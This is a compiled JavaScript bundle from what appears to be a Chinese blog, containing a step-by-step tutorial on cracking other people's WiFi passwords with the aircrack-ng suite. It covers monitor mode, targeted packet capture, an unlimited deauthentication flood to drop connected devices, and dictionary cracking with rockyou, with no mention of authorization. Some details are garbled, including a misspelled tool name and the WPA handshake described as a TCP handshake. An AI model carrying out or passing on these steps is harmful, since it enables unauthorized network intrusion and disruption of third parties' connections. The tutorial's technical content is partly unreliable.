(window.webpackJsonp=window.webpackJsonp||[]).push([[58],{1148:function(t,i,n){"use strict";n.r(i);var s=n(1),a=Object(s.a)({},(function(){var t=this,i=t.$createElement,s=t._self._c||i;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h2",{attrs:{id:"前言"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#前言"}},[t._v("#")]),t._v(" 前言")]),t._v(" "),s("p",[t._v("首先你得需要安装好VMware，其次你需要安装好kali，还需要一个USB网卡(●'◡'●)，故名思意，枚举就是一个一个从字典中暴力破解，这全靠你字典里有啥了，如果对方把密码设置的非常奇特，那你也莫得办法这里就不讲安装的过程了，让我们直入话题！！")]),t._v(" "),s("h2",{attrs:{id:"思路"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#思路"}},[t._v("#")]),t._v(" 思路")]),t._v(" "),s("ol",[s("li",[s("p",[t._v("基础建立")])]),t._v(" "),s("li",[s("p",[s("code",[t._v("ifconfig -a")]),t._v("\n查看无线网卡是否安装成功，如果成功了你会看到下面出现wlan0的出现\n"),s("img",{attrs:{src:n(635),alt:"pic"}})])]),t._v(" "),s("li",[s("p",[s("code",[t._v("airmon-ng kill")]),t._v("\n杀死干扰无线网卡监听热点的信号\n"),s("img",{attrs:{src:n(636),alt:"pic"}})])]),t._v(" "),s("li",[s("p",[s("code",[t._v("airmon-ng start wlan0")]),t._v("\n这里的wlan0默认是无线网卡的名称，此操作是载入自己的网卡名\n"),s("img",{attrs:{src:n(637),alt:"pic"}})])]),t._v(" "),s("li",[s("p",[s("code",[t._v("ifconfig -a")]),t._v("\n结合上面的操作，这里是激活无线网卡，此时无线网卡的名称将会变为wlan0mon，与之前的wlan0不同\n"),s("img",{attrs:{src:n(638),alt:"pic"}})])]),t._v(" "),s("li",[s("p",[t._v("监听")]),t._v(" "),s("ol",[s("li",[s("code",[t._v("airodump-ng wlan0mon")]),t._v("\n开始监听走位wifi热i但，并显示给个热点的信息（ctrl+c停止监听），这里ESSID为wifi的名字，CH为频道，BSSID为wifi的MAC地址，下面的STATION为连接设备的MAC地址\n这里需要用到BSSID\n"),s("img",{attrs:{src:n(639),alt:"pic"}})])])]),t._v(" "),s("li",[s("p",[t._v("攻击")]),t._v(" "),s("ol",[s("li",[s("p",[s("code",[t._v("airodump-ng -c 频道(CH) --bssid 热点的MAC地址 -w /root/桌面 网卡名(默认wlan0mon)")]),t._v("\n这里是抓取制定热点的包(指定监听)，当建立一个终端去攻击连接wifi的设备掉线之后，将抓取的TCP包存储在"),s("code",[t._v("/root/桌面")]),t._v("这个路径\n"),s("img",{attrs:{src:n(640),alt:"pic"}})])]),t._v(" "),s("li",[s("p",[t._v("新建一个终端 "),s("code",[t._v("airepaly-ng -0 0 -c 2.1中STATION设备的MAC地址 -a 热点的MAC地址 网卡名(默认wlan0mon)")]),t._v("\n这里用洪水攻击连接WIFI的设备，-0 0为无限，-0 5则攻击5次\n攻击原理：通过洪水攻击让连接的设备掉线，设备掉线则会再次自动连接，自动连接过程中会进行三次握手，会发送tcp包（里面包含加密的密码数据），kali则伪装成wifi热点去窃取该数据包。当窃取到之后就可以用字典暴力破解加密的wifi密码了！这里你或许会问为什么不直接从数据包里拿呢？因为数据包里的密码哈希加密过了，所以不能使用\n好了，ctrl+c停止泛洪攻击，我们回到前一个抓包的终端，你能看到抓到的TCP包\n"),s("img",{attrs:{src:n(379),alt:"pic"}})])])])]),t._v(" "),s("li",[s("p",[t._v("枚举暴力破解")]),t._v(" "),s("ol",[s("li",[s("p",[s("code",[t._v("gzip -d /usr/share/wordlists/rockyou.txt.gz")]),t._v("\nkali有提供自带的字典，你可以通过gzip命令解压出来")])]),t._v(" "),s("li",[s("p",[s("code",[t._v("aircrack-ng -w 字典的路径 抓取的TCP包")]),t._v("\n如果是上面的例子，那就是"),s("code",[t._v("aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/桌面-0.1.cap")]),t._v("\n过一会你就能得到密码了！\n"),s("img",{attrs:{src:n(379),alt:"pic"}})])])])])])])}),[],!1,null,null,null);i.default=a.exports},379:function(t,i,n){t.exports=n.p+"assets/img/07.2960bb08.png"},635:function(t,i,n){t.exports=n.p+"assets/img/01.3211f3b6.png"},636:function(t,i,n){t.exports=n.p+"assets/img/02.9e1399f0.png"},637:function(t,i,n){t.exports=n.p+"assets/img/03.223f2d28.png"},638:function(t,i,n){t.exports=n.p+"assets/img/04.32c03dc1.png"},639:function(t,i,n){t.exports=n.p+"assets/img/05.0fd1daf6.png"},640:function(t,i,n){t.exports=n.p+"assets/img/06.e294be13.png"}}]);